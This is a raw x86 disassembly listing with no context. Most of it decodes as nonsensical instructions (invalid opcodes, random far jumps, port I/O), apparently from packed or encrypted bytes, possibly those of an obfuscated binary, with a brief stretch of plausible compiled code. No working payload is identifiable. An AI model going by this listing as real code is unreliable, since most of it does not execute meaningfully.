  4042c3:	jae    0x4042ae
  4042c5:	call   0x5ed6:0xc325f369
  4042cc:	rol    DWORD PTR [eax+0x5452061],1
  4042d2:	hlt    
  4042d3:	fisub  WORD PTR [ebp+0x3edde95c]
  4042d9:	sbb    BYTE PTR [edx],ch
  4042db:	pop    esi
  4042dc:	mov    ds:0x832b9a01,al
  4042e1:	adc    al,0xb6
  4042e3:	mov    esi,0x68fbcf20
  4042e8:	ja     0x4042a2
  4042ea:	(bad)  
  4042eb:	aad    0x5c
  4042ed:	aas    
  4042ee:	or     BYTE PTR [ecx],cl
  4042f0:	cmp    eax,0x5f8a1502
  4042f5:	loop   0x4042c5
  4042f7:	rcl    BYTE PTR [edi+0x1e456934],1
  4042fd:	mul    BYTE PTR [edx]
  4042ff:	sub    DWORD PTR [ebx],eax
  404301:	ss sbb esp,ebx
  404304:	int    0x6d
  404306:	and    ecx,0xffffffdb
  404309:	add    BYTE PTR [edi+0x18],bh
  40430c:	neg    esp
  40430e:	or     al,BYTE PTR [ecx]
  404310:	out    0x9c,eax
  404312:	or     bl,cl
  404314:	fiadd  DWORD PTR [ecx+0xd]
  404317:	xlat   BYTE PTR ds:[ebx]
  404318:	sbb    cl,ch
  40431a:	(bad)  
  40431b:	jmp    0x30:0xdda95d86
  404322:	rcl    ebx,0x4
  404325:	in     eax,dx
  404326:	call   0x42415247
  40432b:	daa    
  40432c:	(bad)  
  40432d:	and    al,0x5
  40432f:	addr16 iret 
  404331:	in     eax,dx
  404332:	xor    al,0x5f
  404334:	call   DWORD PTR [edx+0x29]
  404337:	jmp    0x404315
  404339:	hlt    
  40433a:	dec    ebx
  40433b:	rcl    bh,cl
  40433d:	pop    eax
  40433e:	xor    DWORD PTR [ecx+0x7bcb740b],0xfffffffa
  404345:	imul   edi,DWORD PTR [ebx],0x7ced7c28
  40434b:	inc    esi
  40434c:	xchg   ecx,eax
  40434d:	pop    edi
  40434e:	aas    
  40434f:	jno    0x404378
  404351:	sub    bl,BYTE PTR [esi+eax*8-0x69c585ff]
  404358:	out    0x77,eax
  40435a:	cmc    
  40435b:	mov    esi,0xd630b9f4
  404360:	iret   
  404361:	hlt    
  404362:	call   0xe7dbc84e
  404367:	mov    bh,0x86
  404369:	stos   BYTE PTR es:[edi],al
  40436a:	mov    edx,DWORD PTR cs:[ebp-0x5fac2250]
  404371:	jge    0x40430c
  404373:	pop    es
  404374:	push   esi
  404375:	in     al,dx
  404376:	cmp    BYTE PTR [esi],bh
  404378:	popf   
  404379:	imul   edi,esp,0x45
  40437c:	stc    
  40437d:	mov    edx,0xd223e848
  404382:	jmp    0xf631:0xe25c9ad0
  404389:	xor    eax,edi
  40438b:	out    dx,eax
  40438c:	retf   0x9dea
  40438f:	test   eax,0x31e424ae
  404394:	mov    WORD PTR [esi+0x28],?
  404397:	scas   al,BYTE PTR es:[edi]
  404398:	inc    ecx
  404399:	lods   eax,DWORD PTR ds:[esi]
  40439a:	adc    al,0xb0
  40439c:	inc    ebx
  40439d:	addr16 xchg ebp,eax
  40439f:	adc    DWORD PTR [esi-0x15a19292],ebp
  4043a5:	pop    esi
  4043a6:	and    BYTE PTR [ebx+ebx*2+0x20],bl
  4043aa:	add    ecx,DWORD PTR [edi-0x74]
  4043ad:	add    al,0xbd
  4043af:	arpl   si,ax
  4043b1:	fs mov edx,0x9cf2a119
  4043b7:	and    BYTE PTR [esi],bl
  4043b9:	adc    BYTE PTR [ebx+0x3d00528f],ch
  4043bf:	pop    ebx
  4043c0:	jmp    0xc270:0xf44467fd
  4043c7:	push   eax
  4043c8:	test   BYTE PTR [ebx],ch
  4043ca:	pop    ebp
  4043cb:	stos   BYTE PTR es:[edi],al
  4043cc:	(bad)  
  4043cd:	push   ss
  4043ce:	mov    ds,WORD PTR [ecx+0x1cfc4bb0]
  4043d4:	pop    edx
  4043d5:	jmp    DWORD PTR [esi-0x6d43dcde]
  4043db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043dc:	xchg   ebp,eax
  4043dd:	(bad)  
  4043de:	call   FWORD PTR [ebx+0x1a]
  4043e1:	cs cmp al,0xb
  4043e4:	mov    ?,WORD PTR [esi+ecx*8-0x7cb1c31a]
  4043eb:	stos   DWORD PTR es:[edi],eax
  4043ec:	cmp    al,0xad
  4043ee:	test   eax,0x7cebb9af
  4043f3:	xor    ah,BYTE PTR [ebp+0x27]
  4043f6:	icebp  
  4043f7:	or     BYTE PTR [ebp-0x600b559b],bl
  4043fd:	push   ebx
  4043fe:	and    al,0x3f
  404400:	adc    cl,BYTE PTR [edx]
  404402:	push   edi
  404403:	mov    ebx,0x367d43e4
  404408:	loop   0x4043fb
  40440a:	test   BYTE PTR [ebx],dh
  40440c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40440d:	mov    ebx,0xb49ef871
  404412:	loop   0x4043c0
  404414:	push   cs
  404415:	stc    
  404416:	lahf   
  404417:	sub    ch,dh
  404419:	or     ah,al
  40441b:	adc    DWORD PTR [esi],edi
  40441d:	and    BYTE PTR [eax+0x4e],al
  404420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404421:	mov    WORD PTR [edi+0x57],gs
  404424:	xor    ecx,DWORD PTR [edi]
  404426:	jbe    0x4043b9
  404428:	pop    ss
  404429:	ja     0x40445e
  40442b:	sbb    al,0xef
  40442d:	(bad)  [ebx+0xe13561d]
  404433:	ficom  DWORD PTR [ebp-0x23]
  404436:	call   0xd854e6c1
  40443b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40443c:	loopne 0x40440d
  40443e:	mov    bh,0xbf
  404440:	nop
  404441:	jp     0x4044a1
  404443:	push   ebx
  404444:	jmp    0xdde8:0x3966e64b
  40444b:	or     eax,0x3c0e1f81
  404450:	xor    BYTE PTR [ebx+0x4f],ch
  404453:	add    dh,BYTE PTR [eax-0x4089923c]
  404459:	mov    BYTE PTR [ebp-0x5],cl
  40445c:	push   ss
  40445d:	aad    0x8c
  40445f:	sar    BYTE PTR [ecx-0x55985b5b],1
  404465:	pop    es
  404466:	rcl    dh,cl
  404468:	repz jl 0x404480
  40446b:	and    bl,bh
  40446d:	dec    esi
  40446e:	xchg   edx,esp
  404470:	add    al,0xad
  404472:	in     eax,dx
  404473:	push   edx
  404474:	out    0x4d,al
  404476:	lods   eax,DWORD PTR ds:[esi]
  404477:	aas    
  404478:	scas   al,BYTE PTR es:[edi]
  404479:	jo     0x4044cd
  40447b:	arpl   WORD PTR [ebx],si
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044b1
  404490:	and    edx,DWORD PTR ds:0x7e185e61
  404496:	jle    0x4044f0
  404498:	jl     0x404518
  40449a:	jle    0x404508
  40449c:	ins    DWORD PTR es:[edi],dx
  40449d:	fbstp  TBYTE PTR [edi+ecx*2-0x7e]
  4044a1:	test   DWORD PTR [ebx+0x1f],edi
  4044a4:	dec    edi
  4044a5:	retf   0x23c4
  4044a8:	int3   
  4044a9:	push   0xffffffd3
  4044ab:	hlt    
  4044ac:	ins    DWORD PTR es:[edi],dx
  4044ad:	outs   dx,BYTE PTR ds:[esi]
  4044ae:	adc    al,BYTE PTR [esi+0x7d]
  4044b1:	xchg   ebx,eax
  4044b2:	sbb    BYTE PTR [edx+edx*2],0xc8
  4044b6:	scas   eax,DWORD PTR es:[edi]
  4044b7:	les    ecx,FWORD PTR [ebx+0x1d6a949e]
  4044bd:	ds ret 0xa2f9
  4044c1:	in     eax,dx
  4044c2:	and    DWORD PTR es:[edx],edx
  4044c5:	inc    ebp
  4044c6:	xchg   ebp,eax
  4044c7:	dec    edx
  4044c8:	and    al,ah
  4044ca:	mov    al,ds:0x7d99999
  4044cf:	fidiv  DWORD PTR [ebx-0x5e]
  4044d2:	xor    al,0x35
  4044d4:	mov    cl,0x4f
  4044d6:	xchg   esp,eax
  4044d7:	mov    ebx,0x438a5355
  4044dc:	adc    eax,0x4ea8eacc
  4044e1:	pop    ebp
  4044e2:	jg     0x40454a
  4044e4:	or     eax,DWORD PTR gs:[ebx]
  4044e7:	mov    dl,0x4d
  4044e9:	fwait
  4044ea:	mov    edx,0x313c5ece
  4044ef:	sub    BYTE PTR [edi-0x79],bh
  4044f2:	mov    WORD PTR [edi+0x28],es
  4044f5:	retf   0x9ff8
  4044f8:	iret   
  4044f9:	in     al,dx
  4044fa:	sub    BYTE PTR [ecx],0x81
  4044fd:	push   ebx
  4044fe:	add    eax,0x2d5df510
  404503:	xor    esi,DWORD PTR [esi]
  404505:	(bad)  
  404506:	in     al,0x98
  404508:	shl    DWORD PTR [edx+0x22],cl
  40450b:	xchg   ecx,eax
  40450c:	mov    ds:0x12911bca,al
  404511:	test   al,0x22
  404513:	mov    al,ds:0xa8430c7d
  404518:	mov    dl,0x46
  40451a:	pop    ss
  40451b:	dec    esp
  40451c:	ret    
  40451d:	jle    0x404518
  40451f:	repz and eax,0xc9b74b85
  404525:	cs mov cl,0xa2
  404528:	(bad)  
  404529:	(bad)  
  40452a:	adc    al,0x8d
  40452c:	jno    0x4044e9
  40452e:	jmp    0x40451d
  404530:	rol    BYTE PTR [edx],1
  404532:	pusha  
  404533:	or     BYTE PTR [edi],bh
  404535:	and    ebx,DWORD PTR [ecx]
  404537:	push   ds
  404538:	stos   DWORD PTR es:[edi],eax
  404539:	mov    cl,dl
  40453b:	shr    DWORD PTR [edx-0x28],0x1d
  40453f:	in     al,dx
  404540:	ja     0x404540
  404542:	dec    esp
  404543:	or     dh,BYTE PTR [ecx-0x50]
  404546:	cli    
  404547:	test   al,0x4d
  404549:	xor    al,0x5e
  40454b:	jmp    0x40451a
  40454d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40454e:	and    bh,bl
  404550:	lds    esp,FWORD PTR [esi]
  404552:	sbb    eax,0xad8b57ae
  404557:	add    edi,DWORD PTR ds:0x4dec7743
  40455d:	mov    ebx,0x147fe9db
  404562:	shr    BYTE PTR [edi],0x7a
  404565:	push   edi
  404566:	mov    ebx,DWORD PTR [ebx]
  404568:	pop    eax
  404569:	inc    esp
  40456a:	leave  
  40456b:	jmp    0xb9b278e
  404570:	jnp    0x404539
  404572:	mov    dl,0x8a
  404574:	pop    esi
  404575:	retf   0x4ee1
  404578:	xchg   BYTE PTR [esi-0x5126ed44],bl
  40457e:	test   esp,0x560f5547
  404584:	daa    
  404585:	out    0xbf,al
  404587:	inc    DWORD PTR [ecx-0x8d72339]
  40458d:	xchg   BYTE PTR [esi+0x2],dl
  404590:	sbb    eax,0xf74341a3
  404595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404596:	test   BYTE PTR [ebp-0x5b7a13f5],dl
  40459c:	out    0xb0,eax
  40459e:	mov    edx,0xcf2f23e9
  4045a3:	add    dh,bh
  4045a5:	aaa    
  4045a6:	cs call 0x13df:0x6659791
  4045ae:	jmp    0x1aa71876
  4045b3:	pop    edx
  4045b4:	mov    esp,0x48fd1078
  4045b9:	jmp    0xaec1f708
  4045be:	push   ss
  4045bf:	enter  0x9001,0x78
  4045c3:	dec    edi
  4045c4:	out    0x2,eax
  4045c6:	mov    bl,BYTE PTR [eax+0x41]
  4045c9:	sbb    al,0x9a
  4045cb:	pop    edx
  4045cc:	dec    ecx
  4045cd:	sbb    al,0x6f
  4045cf:	(bad)  
  4045d0:	into   
  4045d1:	lods   al,BYTE PTR ds:[esi]
  4045d2:	xchg   esi,eax
  4045d3:	mov    ebp,0xb7cfaf37
  4045d8:	xchg   BYTE PTR [eax],bh
  4045da:	lds    ebp,FWORD PTR ds:[edx-0x43]
  4045de:	lods   al,BYTE PTR ds:[esi]
  4045df:	icebp  
  4045e0:	and    DWORD PTR [esi-0x40fddc2b],esp
  4045e6:	add    BYTE PTR [eax+0x5a4961e7],bl
  4045ec:	push   ds
  4045ed:	dec    esi
  4045ee:	dec    ecx
  4045ef:	int3   
  4045f0:	ins    DWORD PTR es:[edi],dx
  4045f1:	mov    es,WORD PTR [ecx+0x514627db]
  4045f7:	mov    edx,0x3670aba3
  4045fc:	push   0x7ad414e0
  404601:	outs   dx,DWORD PTR ds:[esi]
  404602:	xor    al,0x6d
  404604:	mul    DWORD PTR [ebx+0x1ac618fb]
  40460a:	mov    ebx,0x949a4323
  40460f:	cld    
  404610:	xchg   ecx,eax
  404611:	mov    dl,0x55
  404613:	pop    esp
  404614:	scas   eax,DWORD PTR es:[edi]
  404615:	out    0x29,eax
  404617:	(bad)
  40461a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40461b:	xchg   esp,eax
  40461c:	arpl   WORD PTR [edi+0x7c],dx
  40461f:	jmp    0x2ff686a1
  404624:	ret    
  404625:	ja     0x4045b2
  404627:	push   cs
  404628:	outs   dx,BYTE PTR ds:[esi]
  404629:	sbb    DWORD PTR [edx],esp
  40462b:	jmp    0x6cdf403d
  404630:	mov    al,BYTE PTR [eax-0x38]
  404633:	mov    ebp,0xc266ce9
  404638:	pusha  
  404639:	pop    ebp
  40463a:	mov    ebx,0xdcc0ccc3
  40463f:	adc    cl,cl
  404641:	push   esi
  404642:	mov    esi,0x4acf5158
  404647:	rcl    BYTE PTR [edi-0x17657fac],1
  40464d:	xor    ch,cl
  40464f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404650:	mov    dl,0xf1
  404652:	xor    BYTE PTR [eax+ebp*8+0x7f],0xca
  404657:	mov    ebx,0xd7557748
  40465c:	lahf   
  40465d:	popa   
  40465e:	inc    ebp
  40465f:	fld    TBYTE PTR [edi+0x75]
  404662:	adc    BYTE PTR [edx-0x1d],cl
  404665:	mov    al,0xf8
  404667:	mov    eax,ds:0x3a551448
  40466c:	rol    BYTE PTR [esp+edx*1],cl
  40466f:	ja     0x4046a2
  404671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404672:	fnsave [ecx+0x54]
  404675:	pop    edi
  404676:	lahf   
  404677:	ins    DWORD PTR es:[edi],dx
  404678:	call   0x673a5b28
  40467d:	into   
  40467e:	leave  
  40467f:	add    eax,0xdd1fe88d
  404684:	jo     0x4046c5
  404686:	inc    ebp
  404687:	ror    cl,1
  404689:	sbb    DWORD PTR [ebp+ecx*4-0x33],0xf0cc0b32
  404691:	stos   DWORD PTR es:[edi],eax
  404692:	inc    ebp
  404693:	xchg   edx,eax
  404694:	call   0x848f:0x1d3bc6bf
  40469b:	test   eax,0x4614dbfb
  4046a0:	push   edx
  4046a1:	push   ecx
  4046a2:	inc    esp
  4046a3:	sbb    al,0xae
  4046a5:	dec    eax
  4046a6:	xor    DWORD PTR [eiz*8+0x4307f6ed],0xffffff9b
  4046ae:	aaa    
  4046af:	es repnz dec ecx
  4046b2:	pop    es
  4046b3:	sub    esi,0x45
  4046b6:	cs in  eax,dx
  4046b8:	outs   dx,DWORD PTR ds:[esi]
  4046b9:	sbb    BYTE PTR [edx],cl
  4046bb:	aaa    
  4046bc:	cmc    
  4046bd:	repz or BYTE PTR [edx-0x9],cl
  4046c1:	jl     0x404697
  4046c3:	cmp    bh,BYTE PTR [ecx]
  4046c5:	ret    0x108b
  4046c8:	in     al,dx
  4046c9:	bound  ecx,QWORD PTR [edx-0x9]
  4046cc:	shl    BYTE PTR [esp+edx*1],1
  4046cf:	pushf  
  4046d0:	or     cl,BYTE PTR ss:[edx]
  4046d3:	mov    ebx,0x94036126
  4046d8:	adc    eax,0x1f3c25b4
  4046dd:	ins    DWORD PTR es:[edi],dx
  4046de:	xchg   esi,eax
  4046df:	sub    ecx,edi
  4046e1:	inc    esi
  4046e2:	jmp    0x40468e
  4046e4:	(bad)  
  4046e5:	push   edi
  4046e6:	xchg   esi,eax
  4046e7:	repnz lock dec eax
  4046ea:	retf   
  4046eb:	lea    edx,[edx]
  4046ed:	stc    
  4046ee:	xchg   esp,eax
  4046ef:	ret    0x3f7f
  4046f2:	mov    eax,ds:0x57f8267
  4046f7:	fiadd  WORD PTR [eax]
  4046f9:	sbb    DWORD PTR [esi-0x17],eax
  4046fc:	xchg   dl,bl
  4046fe:	ret    
  4046ff:	popa   
  404700:	shl    ebx,0x34
  404703:	cwde   
  404704:	ret    0xa41
  404707:	call   0x6afe:0x17822aa5
  40470e:	dec    esp
  40470f:	cmp    eax,0x5760430c
  404714:	fcomip st,st(1)
  404716:	or     eax,0xe787737f
  40471b:	popf   
  40471c:	stos   DWORD PTR es:[edi],eax
  40471d:	aad    0xfb
  40471f:	jbe    0x40475e
  404721:	or     al,0x51
  404723:	clc    
  404724:	xchg   edx,eax
  404725:	aam    0xad
  404727:	xlat   BYTE PTR ds:[ebx]
  404728:	js     0x40474b
  40472a:	or     esi,eax
  40472c:	test   DWORD PTR [ebx-0x47],0xb1adf338
  404733:	mov    ebp,fs
  404735:	rcl    DWORD PTR [esi-0x56],0x49
  404739:	gs in  eax,dx
  40473b:	add    dl,bh
  40473d:	mov    ch,0xf
  40473f:	pop    ss
  404740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404741:	adc    BYTE PTR [ecx-0x68],cl
  404744:	xchg   ebp,eax
  404745:	mov    edi,0x1319f765
  40474a:	push   cs
  40474b:	inc    esp
  40474c:	sub    cl,BYTE PTR [esi+0x6c]
  40474f:	mov    ebp,0x4a9d3a30
  404754:	stc    
  404755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404756:	and    dl,BYTE PTR [edx+0x64]
  404759:	and    BYTE PTR ds:0x3c766046,ah
  40475f:	jp     0x404792
  404761:	jmp    0x1a7b:0x679fe961
  404768:	push   ebp
  404769:	call   0xd6ad:0x84df89db
  404770:	(bad)  
  404771:	mov    DWORD PTR [ecx+0x1b],ebp
  404774:	gs in  eax,0x36
  404777:	mov    eax,0x7f257b86
  40477c:	(bad)  
  40477d:	scas   al,BYTE PTR es:[edi]
  40477e:	inc    ebp
  40477f:	aaa    
  404780:	mov    BYTE PTR [ebx],dh
  404782:	rol    BYTE PTR [ebx],1
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	jbe    0x404752
  4047b6:	ja     0x40474c
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x40474d
  4047c1:	push   0xffffff9f
  4047c3:	popf   
  4047c4:	popf   
  4047c5:	or     DWORD PTR [edi],edx
  4047c7:	popa   
  4047c8:	sahf   
  4047c9:	(bad)  
  4047cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047ce:	xor    BYTE PTR [ebp-0xc99e43a],0x31
  4047d5:	mov    dh,0x61
  4047d7:	sti    
  4047d8:	cmp    BYTE PTR [ebp-0x3b],bh
  4047db:	or     al,BYTE PTR [esi]
  4047dd:	out    dx,eax
  4047de:	ret    0x3c7f
  4047e1:	add    al,0x5f
  4047e3:	lahf   
  4047e4:	in     al,0x30
  4047e6:	jmp    0x40477e
  4047e8:	adc    edi,DWORD PTR [ebx+0x1]
  4047eb:	pop    esp
  4047ec:	jae    0x40480b
  4047ee:	mov    esp,0x5a4d75ac
  4047f3:	or     cl,BYTE PTR [ebp-0x5bc10d37]
  4047f9:	test   al,0x73
  4047fb:	jo     0x404833
  4047fd:	fs jmp 0x4132:0xec75bcad
  404805:	sbb    eax,0x48752d61
  40480a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40480b:	in     al,0x18
  40480d:	dec    edi
  40480e:	inc    eax
  40480f:	test   al,0x98
  404811:	ins    BYTE PTR es:[edi],dx
  404812:	push   esp
  404813:	imul   eax
  404815:	in     al,0xbb
  404817:	pop    esi
  404818:	popf   
  404819:	sar    BYTE PTR [edx+0x6c],cl
  40481c:	pop    ds
  40481d:	out    dx,eax
  40481e:	dec    esi
  40481f:	stos   DWORD PTR es:[edi],eax
  404820:	iret   
  404821:	or     DWORD PTR [ecx-0x770e3d9e],eax
  404827:	and    ebx,DWORD PTR [ecx-0x42]
  40482a:	push   DWORD PTR [eax]
  40482c:	nop
  40482d:	lods   eax,DWORD PTR ds:[esi]
  40482e:	dec    ecx
  40482f:	and    BYTE PTR [ebp-0x1fd5e658],ah
  404835:	call   0x2f98cc4d
  40483a:	cld    
  40483b:	mov    esp,0x5d03ddc7
  404840:	clc    
  404841:	pop    es
  404842:	ss xchg ebp,eax
  404844:	mov    edx,0x610bfff0
  404849:	test   eax,0xe3127b43
  40484e:	lods   al,BYTE PTR ds:[esi]
  40484f:	int3   
  404850:	popf   
  404851:	dec    eax
  404852:	in     eax,dx
  404853:	pop    ds
  404854:	and    dh,ah
  404856:	outs   dx,DWORD PTR ds:[esi]
  404857:	pop    edi
  404858:	xchg   ecx,eax
  404859:	or     DWORD PTR [eax],ebp
  40485b:	mov    ds:0x4e8e3fdc,al
  404860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404861:	out    dx,al
  404862:	or     DWORD PTR [ebx],ebp
  404864:	jae    0x404831
  404866:	sbb    BYTE PTR [edx],al
  404868:	in     eax,dx
  404869:	jno    0x4048c1
  40486b:	jmp    0xda0e3f85
  404870:	aad    0x14
  404872:	cmp    DWORD PTR [ecx-0x74],eax
  404875:	mov    eax,ds:0x4b0ea7b6
  40487a:	push   edx
  40487b:	loop   0x404896
  40487d:	scas   eax,DWORD PTR es:[edi]
  40487e:	lock mov fs,WORD PTR [esi+0x3f]
  404882:	xchg   ecx,eax
  404883:	mov    al,BYTE PTR [esi+0x40]
  404886:	dec    esi
  404887:	mov    cl,0x24
  404889:	and    ecx,eax
  40488b:	rcr    BYTE PTR [edi+eiz*4-0x652b6f6a],cl
  404892:	jge    0x40481c
  404894:	mov    bh,0x34
  404896:	inc    eax
  404897:	bound  ebx,QWORD PTR [ecx-0x32]
  40489a:	lds    edx,FWORD PTR [edi]
  40489c:	(bad)  
  40489d:	in     al,dx
  40489e:	inc    eax
  40489f:	dec    esi
  4048a0:	mov    edi,0x7cff0738
  4048a5:	xor    BYTE PTR [ebx-0x73cc4924],al
  4048ab:	loop   0x4048a5
  4048ad:	mov    dl,BYTE PTR [edi+0x1dcb1f84]
  4048b3:	push   ss
  4048b4:	sub    dl,BYTE PTR ds:0xac65ada9
  4048ba:	push   esi
  4048bb:	jno    0x40493b
  4048bd:	or     al,0x10
  4048bf:	iret   
  4048c0:	cmp    ch,BYTE PTR [esp+ebp*8-0x91d4262]
  4048c7:	pop    edx
  4048c8:	pop    es
  4048c9:	out    dx,al
  4048ca:	pusha  
  4048cb:	mov    esp,0x86ec691b
  4048d0:	dec    edx
  4048d1:	call   0x63f2b675
  4048d6:	pop    ds
  4048d7:	das    
  4048d8:	push   ecx
  4048d9:	adc    bl,BYTE PTR [ebp+ecx*8+0x3b]
  4048dd:	and    esp,DWORD PTR [eax-0x38]
  4048e0:	adc    esi,DWORD PTR [esp+ebx*4+0x2a593617]
  4048e7:	shl    DWORD PTR [esi-0x31],0x78
  4048eb:	and    ah,BYTE PTR [ecx+0x5cb08c15]
  4048f1:	sub    eax,DWORD PTR [ebx]
  4048f3:	leave  
  4048f4:	cmp    eax,0x773fef8a
  4048f9:	ins    DWORD PTR es:[edi],dx
  4048fa:	mov    edx,0xbfb31cc1
  4048ff:	sub    dl,BYTE PTR [ebx-0x61]
  404902:	and    al,0xe0
  404904:	sbb    BYTE PTR [ecx-0x1e5dc2fd],dl
  40490a:	push   esp
  40490b:	push   esp
  40490c:	inc    edx
  40490d:	sbb    DWORD PTR [esi+ebx*4+0x43],edi
  404911:	inc    ebx
  404912:	shl    BYTE PTR [eax-0x5c1a8d66],0x67
  404919:	mov    ds:0x86e6e155,al
  40491e:	imul   DWORD PTR [edx+0x72]
  404921:	dec    esp
  404922:	cmp    dl,BYTE PTR [esi]
  404924:	xlat   BYTE PTR ds:[ebx]
  404925:	mov    eax,ds:0xdd74a566
  40492a:	fdiv   st,st(4)
  40492c:	(bad)  
  40492d:	mov    edx,0xc8c09e75
  404932:	jmp    0x4048f1
  404934:	adc    eax,0x95e0fbfd
  404939:	and    eax,0x8cc8c34b
  40493e:	addr16 ret 0xa5c6
  404942:	pop    es
  404943:	out    dx,eax
  404944:	or     ecx,DWORD PTR [ecx*8-0x73498f2c]
  40494b:	jl     0x404965
  40494d:	mov    eax,ds:0xfed3b6d6
  404952:	fdivrp st(3),st
  404954:	imul   BYTE PTR [ebp+0x74]
  404957:	mov    al,ds:0xedf72946
  40495c:	push   ebp
  40495d:	lds    ebx,FWORD PTR [edi+eax*4+0x62]
  404961:	mov    dl,0xf1
  404963:	push   esi
  404964:	lea    esi,[esi-0x4b]
  404967:	je     0x4048e9
  404969:	(bad)  
  40496a:	es xchg edi,eax
  40496c:	add    al,0x4d
  40496e:	div    esp
  404970:	jmp    0x1ef949ee
  404975:	mov    ch,BYTE PTR [ecx-0x3e230fb4]
  40497b:	mov    esp,0x77efd38e
  404980:	loop   0x40493b
  404982:	adc    al,0x87
  404984:	outs   dx,BYTE PTR ds:[esi]
  404985:	xor    bl,BYTE PTR [ecx+0x63]
  404988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404989:	inc    ecx
  40498a:	stos   BYTE PTR es:[edi],al
  40498b:	les    ebx,FWORD PTR [edx-0x286a6382]
  404991:	dec    BYTE PTR [edx-0x54]
  404994:	lods   eax,DWORD PTR ds:[esi]
  404995:	xchg   ecx,eax
  404996:	pop    ebx
  404997:	adc    eax,0x9bbc8ed0
  40499c:	mov    edx,0xb01eb16a
  4049a1:	pop    es
  4049a2:	fisttp WORD PTR [esi+esi*1+0x27]
  4049a6:	push   ss
  4049a7:	imul   eax,DWORD PTR [ebx-0x6af2abf0],0x7d9127e
  4049b1:	repnz sub cl,ch
  4049b4:	cmp    dl,BYTE PTR [edi+esi*1]
  4049b7:	xor    al,BYTE PTR es:[bx]
  4049bb:	fdivr  DWORD PTR [esi-0x61]
  4049be:	xor    eax,0x550ebd6c
  4049c3:	sub    DWORD PTR [eax+0x46],edi
  4049c6:	xlat   BYTE PTR ds:[ebx]
  4049c7:	adc    eax,0x651b12ce
  4049cc:	dec    ebp
  4049cd:	mov    al,0x7d
  4049cf:	mov    al,ds:0xbf3745ff
  4049d4:	jo     0x404a25
  4049d6:	inc    ecx
  4049d7:	out    dx,eax
  4049d8:	out    0x29,eax
  4049da:	test   al,0x9f
  4049dc:	test   al,0xd7
  4049de:	sub    bh,BYTE PTR [edx-0x16]
  4049e1:	sub    ah,dl
  4049e3:	push   ebx
  4049e4:	cli    
  4049e5:	sub    dl,dh
  4049e7:	fiadd  DWORD PTR [edi]
  4049e9:	jbe    0x4049c0
  4049eb:	ret    
  4049ec:	inc    esi
  4049ed:	xor    BYTE PTR [edx-0x5ae1b9e5],ch
  4049f3:	jmp    0x4f00:0x6c705f4a
  4049fa:	mov    esi,0x457be72c
  4049ff:	hlt    
  404a00:	ret    0x1b18
  404a03:	daa    
  404a04:	push   ecx
  404a05:	jbe    0x404a59
  404a07:	int    0x94
  404a09:	or     al,0x28
  404a0b:	inc    ebx
  404a0c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a0e:	push   ebx
  404a0f:	fisub  WORD PTR [esi]
  404a11:	push   ebp
  404a12:	push   cs
  404a13:	jmp    0x4049e0
  404a15:	dec    edi
  404a16:	mov    ss:0x28ec5e09,al
  404a1c:	mov    bh,0x92
  404a1e:	xchg   ebx,eax
  404a1f:	cmp    ecx,esp
  404a21:	mov    BYTE PTR [ebp-0x3ffb9ef9],0x44
  404a28:	loope  0x404a4f
  404a2a:	add    cl,BYTE PTR [edi]
  404a2c:	aas    
  404a2d:	push   esp
  404a2e:	addr16 gs pop eax
  404a31:	inc    esi
  404a32:	pusha  
  404a33:	pop    ds
  404a34:	xchg   BYTE PTR cs:[esi-0x461b5812],ah
  404a3b:	mov    cl,0x1b
  404a3d:	inc    ebp
  404a3e:	inc    ecx
  404a3f:	add    BYTE PTR [ebp+ebp*1-0x6],ah
  404a43:	xor    edi,eax
  404a45:	push   eax
  404a46:	sar    BYTE PTR [edi+0x75e07dc6],0x18
  404a4d:	(bad)  
  404a4e:	scas   al,BYTE PTR es:[edi]
  404a4f:	sahf   
  404a50:	arpl   ax,si
  404a52:	stos   BYTE PTR es:[edi],al
  404a53:	test   eax,0x6ef4bd18
  404a58:	push   ds
  404a59:	arpl   WORD PTR [esi+0x7b],cx
  404a5c:	and    al,0x2b
  404a5e:	lods   eax,DWORD PTR ds:[esi]
  404a5f:	out    dx,eax
  404a60:	pop    edi
  404a61:	jns    0x404a7a
  404a63:	ds mov ?,esi
  404a66:	sbb    BYTE PTR [ebx+edi*1+0x184b4dec],bh
  404a6d:	test   dl,cl
  404a6f:	push   esp
  404a70:	mov    DWORD PTR [ecx+0x6d],esi
  404a73:	std    
  404a74:	into   
  404a75:	push   ds
  404a76:	(bad)  
  404a77:	jmp    0x404a90
  404a79:	fst    QWORD PTR ds:0x8b3cdff0
  404a7f:	jecxz  0x404a39
  404a81:	xor    bh,BYTE PTR [ebx]
  404a83:	dec    esp
  404a84:	test   esi,ebp
  404a86:	mov    al,0xc7
